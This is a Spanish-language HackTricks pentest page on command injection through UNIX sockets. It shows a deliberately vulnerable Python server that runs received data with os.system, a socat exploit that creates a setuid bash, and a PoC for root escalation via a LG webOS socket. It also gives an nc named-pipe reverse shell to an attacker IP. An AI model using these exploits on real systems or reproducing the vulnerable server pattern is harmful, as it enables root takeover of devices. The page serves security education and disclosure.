# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Ejemplo de binding de un socket con Python

En el siguiente ejemplo se **crea un unix socket** (`/tmp/socket_test.s`) y todo lo que se **recibe** va a ser **ejecutado** por `os.system`. Sé que no vas a encontrar esto en la práctica, pero el objetivo de este ejemplo es ver cómo es el código que utiliza unix sockets y cómo gestionar la entrada en el peor caso posible.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Ejecuta** el código usando python: `python s.py` y **comprueba cómo está escuchando el socket**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Caso práctico: escalada activada por señales mediante un socket UNIX propiedad de root (LG webOS)

Algunos daemons privilegiados exponen un socket UNIX propiedad de root que acepta input no confiable y vincula acciones privilegiadas a thread-IDs y señales. Si el protocolo permite que un cliente sin privilegios influya en qué native thread se selecciona como objetivo, es posible activar un code path privilegiado y realizar una escalada.<sup>[[1]](#references)[[2]](#references)</sup>

El write-up principal y la disclosure describen la siguiente secuencia.<sup>[[1]](#references)[[2]](#references)</sup>

Patrón observado:
- Conectarse a un socket propiedad de root (por ejemplo, /tmp/remotelogger).
- Crear un thread y obtener su native thread id (TID).
- Enviar el TID (packed) junto con padding como request; recibir un acknowledgement.
- Enviar una señal específica a ese TID para activar el comportamiento privilegiado.

El PoC condensado que aparece a continuación reproduce esa secuencia.<sup>[[1]](#references)[[2]](#references)</sup>
Esquema mínimo de PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Para convertir esto en una shell de root, se puede usar un patrón simple de named-pipe + nc.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- Esta clase de bugs surge al confiar en valores derivados del estado de un cliente sin privilegios (TIDs) y vincularlos a signal handlers o lógica con privilegios.<sup>[[1]](#references)</sup>
- Refuerza la seguridad aplicando credenciales en el socket, validando los formatos de los mensajes y desacoplando las operaciones con privilegios de los identificadores de thread proporcionados externamente.

## References

- [1] [Jailbreak de webOS por diversión (solo por diversión)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [Path Traversal, Authentication Bypass y toma de control total de dispositivos LG WebOS TV (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
